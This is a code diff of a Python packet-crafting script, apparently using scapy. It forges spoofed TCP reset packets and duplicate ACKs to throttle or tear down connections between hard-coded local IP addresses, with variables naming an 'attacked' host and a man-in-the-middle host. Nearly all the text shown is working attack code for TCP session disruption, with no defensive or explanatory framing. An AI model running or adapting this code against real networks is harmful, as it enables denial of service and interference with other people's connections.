@@ -42,18 +42,19 @@ def retransmit_ack(packet):
 def rst(packet):
     if packet.haslayer(TCP):
         print(f"sourceIp is: {packet[IP].src}. dstIp is: {packet[IP].dst}.")
-        rst_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="R", seq=packet[TCP].seq, ack=packet[TCP].ack)
+        ip = IP(src=packet[IP].src, dst=packet[IP].dst) 
+        tcp = TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, flags="R", seq=packet[TCP].seq + 420)
+        rst_packet = ip / tcp
         sendp(rst_packet, iface="enp3s0")
 
 def main():
     sourceIp = "192.168.0.177"
-    dstIp = "192.168.0.192"
-
+    mitmIp = "192.168.0.192"
     #attackedIp = input("sourceIp: ")
     #mitmIp = input("dstIp: ")
     #throttle = input("throttle: ")
-    throttleTCP(sourceIp, dstIp, "dublicateACK")
-    #throttleTCP(sourceIp, dstIp, "RST")
+    throttleTCP(sourceIp, mitmIp, "dublicateACK")
+    #throttleTCP(sourceIp, mitmIp, "RST")
 
 if __name__=="__main__":
     main()
